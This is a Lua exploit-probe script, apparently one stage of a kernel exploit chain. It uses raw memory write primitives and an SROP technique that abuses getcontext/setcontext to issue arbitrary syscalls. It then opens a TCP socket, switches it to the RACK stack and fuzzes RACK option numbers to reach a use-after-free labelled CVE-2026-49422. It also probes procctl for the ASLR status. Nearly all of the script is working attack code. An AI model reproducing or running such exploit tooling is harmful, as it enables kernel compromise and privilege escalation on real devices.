-- CRASH_CLASS: MODERATE
-- PROBE 145a: Test if TCP RACK setsockopt is reachable (CVE-2026-49422)
--
-- SA-26:43.tcp: RACK setsockopt handler drops lock during copyin.
-- Thread A: setsockopt(TCP_RACK_*), Thread B: close(fd) = UAF.
-- First: check if TCP RACK options are accepted at all.

print("=== PROBE 145a: TCP RACK CVE-2026-49422 ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- [A] Create a TCP socket (AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6)
print("--- [A] TCP SOCKET ---")
local sock_rv = srop(97, uint64(2), uint64(1), uint64(6))
local sock_fd = sock_rv and to_num(sock_rv) or -1
print("socket=" .. sock_fd)

if sock_fd < 0 then
    print("socket FAILED, trying make_syscall")
    local ok_s, sfd = pcall(function()
        return make_syscall(97)(uint64(2), uint64(1), uint64(6))
    end)
    sock_fd = ok_s and to_num(sfd) or -1
    print("socket2=" .. sock_fd)
end

if sock_fd < 0 then
    print("NO TCP SOCKET")
    print("=== DONE ===")
    return
end

-- Connect to loopback (not needed for setsockopt test, just bind)
-- First test: setsockopt without connection
print("--- [B] SETSOCKOPT TCP OPTIONS ---")

local optbuf = memory.alloc(64)
local optlen = memory.alloc(8)

-- Standard TCP options first
-- TCP_NODELAY=1
wd(optbuf, 1)
local r1 = srop(105, uint64(sock_fd), uint64(6), uint64(1), uint64(optbuf), uint64(4))
print("TCP_NODELAY=" .. (r1 and tostring(to_num(r1)) or "nil"))

-- TCP_MAXSEG=2
wd(optbuf, 1460)
local r2 = srop(105, uint64(sock_fd), uint64(6), uint64(2), uint64(optbuf), uint64(4))
print("TCP_MAXSEG=" .. (r2 and tostring(to_num(r2)) or "nil"))

-- TCP_KEEPIDLE=256
wd(optbuf, 60)
local r3 = srop(105, uint64(sock_fd), uint64(6), uint64(256), uint64(optbuf), uint64(4))
print("TCP_KEEPIDLE(256)=" .. (r3 and tostring(to_num(r3)) or "nil"))

-- TCP_FUNCTION_BLK=8192 (switch TCP stack to RACK)
print("--- [C] TCP STACK SWITCH ---")
-- struct tcp_function_set: char name[TCP_FUNCTION_NAME_LEN_MAX(32)]; int num_names; int pcbcnt
local tfs = memory.alloc(64)
for i = 0, 63 do memory.write_byte(tfs + i, 0) end
local rack_name = "rack"
for i = 1, #rack_name do
    memory.write_byte(tfs + i - 1, string.byte(rack_name, i))
end
local r4 = srop(105, uint64(sock_fd), uint64(6), uint64(8192), uint64(tfs), uint64(36))
print("TCP_FUNCTION_BLK(rack)=" .. (r4 and tostring(to_num(r4)) or "nil"))

-- Try "freebsd" stack
for i = 0, 31 do memory.write_byte(tfs + i, 0) end
local fb_name = "freebsd"
for i = 1, #fb_name do
    memory.write_byte(tfs + i - 1, string.byte(fb_name, i))
end
local r5 = srop(105, uint64(sock_fd), uint64(6), uint64(8192), uint64(tfs), uint64(36))
print("TCP_FUNCTION_BLK(freebsd)=" .. (r5 and tostring(to_num(r5)) or "nil"))

-- Try getting current TCP stack
wd(optlen, 36)
for i = 0, 35 do memory.write_byte(tfs + i, 0) end
local r6 = srop(118, uint64(sock_fd), uint64(6), uint64(8192), uint64(tfs), uint64(optlen))
print("getsockopt(TCP_FUNCTION_BLK)=" .. (r6 and tostring(to_num(r6)) or "nil"))
if r6 and to_num(r6) == 0 then
    local name = ""
    for i = 0, 31 do
        local b = to_num(memory.read_byte(tfs + i))
        if b == 0 then break end
        name = name .. string.char(b)
    end
    print("current_stack=" .. name)
end

-- RACK-specific options (1024+)
print("--- [D] RACK OPTIONS ---")
for opt = 1024, 1040 do
    wd(optbuf, 1)
    local r = srop(105, uint64(sock_fd), uint64(6), uint64(opt), uint64(optbuf), uint64(4))
    local rv = r and to_num(r) or -999
    if rv ~= -1 and rv ~= 4294967295 then
        print("TCP_OPT_" .. opt .. "=" .. rv .. " ***")
    end
end

-- [E] Test procctl (syscall 544) for ASLR ops
print("")
print("--- [E] PROCCTL ---")
-- PROC_ASLR_CTL = 13, PROC_ASLR_STATUS = 14
-- idtype=0 (P_PID), id=pid
for cmd = 0, 20 do
    local outbuf = memory.alloc(16)
    wd(outbuf, 0)
    local r = srop(544, uint64(0), uint64(pid), uint64(cmd), uint64(outbuf))
    local rv = r and to_num(r) or -999
    if rv ~= -1 and rv ~= 4294967295 and rv ~= -999 then
        local val = to_num(memory.read_dword(outbuf))
        print("procctl(" .. cmd .. ")=" .. rv .. " buf=0x" .. string.format("%08X", val))
    end
end

-- PROC_ASLR_STATUS=14 specifically
local aslr_buf = memory.alloc(8)
wd(aslr_buf, 0)
local r_aslr = srop(544, uint64(0), uint64(pid), uint64(14), uint64(aslr_buf))
print("PROC_ASLR_STATUS=" .. (r_aslr and tostring(to_num(r_aslr)) or "nil"))
if r_aslr and to_num(r_aslr) == 0 then
    print("aslr_val=" .. to_num(memory.read_dword(aslr_buf)))
end

-- Close socket
srop(6, uint64(sock_fd))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
